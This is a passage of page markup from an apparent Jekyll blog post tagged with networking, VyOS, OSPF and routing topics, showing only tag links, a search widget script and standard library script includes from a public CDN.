class="post-tag" href="/tags/networking/">Networking</a> <a class="post-tag" href="/tags/vyos/">VyOS</a> <a class="post-tag" href="/tags/ospf/">OSPF</a> <a class="post-tag" href="/tags/routing/">Routing</a> <a class="post-tag" href="/tags/soho/">SOHO</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
